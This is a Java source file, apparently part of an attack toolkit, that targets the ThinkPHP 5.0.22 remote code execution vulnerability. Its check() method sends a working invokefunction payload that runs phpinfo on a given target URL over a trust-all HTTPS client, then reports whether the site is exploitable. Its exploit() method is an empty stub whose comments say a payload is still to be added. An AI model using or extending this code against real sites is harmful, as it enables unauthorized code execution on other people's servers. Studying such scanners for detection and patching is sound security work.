import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;

import java.util.concurrent.TimeUnit;

/**
 * ThinkPHP5.0.22远程代码执行漏洞EXP
 */
public class Tp5_0_22 {



    /**
     * 检测网站是否存在ThinkPHP5.0.22远程代码执行漏洞
     * @param targetUrl
     * @return
     * @throws Exception
     */
    public boolean check(String targetUrl) throws Exception{
        boolean result=false;
        //封装Get请求,注意payload的位置public/index.php?
        String payload="/index.php?s=index%2f\\think\\app%2finvokefunction&function=phpinfo&vars[0]=100";
        String fullUrl=targetUrl+payload;
        if(fullUrl.indexOf("http")==-1){
            fullUrl="http://"+fullUrl;
        }
        String finger="arg_separator.output";
        int indexOfValue=99999;    //记录indexOf返回的结果,99999代表网站异常
        Request request=new Request.Builder()
                .url(fullUrl)
                .addHeader("Connection", "close")
                .build();

        //判断targetUrl是https协议还是http协议
        if(targetUrl.indexOf("https")!=-1){
            //利用封装好的HTTPS库，这里调用一下
            HttpsUtils httpsUtils=new HttpsUtils();
            OkHttpClient okHttpClient2=httpsUtils.getTrustAllClient();
            okHttpClient2.newBuilder()
                    .connectTimeout(30,TimeUnit.SECONDS)
                    .readTimeout(30,TimeUnit.SECONDS)
                    .writeTimeout(30, TimeUnit.SECONDS)
                    .build();
            //https协议发送payload
            Response response=okHttpClient2.newCall(request).execute();    //这一步容易出现异常
            String responseBody=response.body().string();
            indexOfValue=responseBody.indexOf(finger);
        }
        else{
            OkHttpClient okHttpClient=new OkHttpClient.Builder()
                    .connectTimeout(30, TimeUnit.SECONDS)
                    .readTimeout(30, TimeUnit.SECONDS)
                    .writeTimeout(30, TimeUnit.SECONDS)
                    .build();
            //http协议发送payload
            //发送请求包，获得返回包
            Response response=okHttpClient.newCall(request).execute();
            String responseBody=response.body().string();
            indexOfValue=responseBody.indexOf(finger);
        }

        //根据indexOfValue的值决定返回结果为true还是false
        switch (indexOfValue){
            case -1:
                System.out.println(targetUrl+"    未扫描到漏洞");
                return false;
            default:
                System.out.println(targetUrl+"    存在ThinkPHP_5.0.22远程代码执行漏洞");
                return true;
        }

    }

    public boolean exploit(String url){
        String fullUrl="";
        String tempStr=url.substring(0,5).toLowerCase();
        if(tempStr.indexOf("https")==-1){
            //http请求
            if(tempStr.indexOf("http")==-1){
                fullUrl="http://"+url;   //应该还加上payload
            }else {
                fullUrl=url;    //应该加上payload
            }
        }else {
            //https请求
            fullUrl=url;  //需要加上payload
        }
        return false;
    }


}
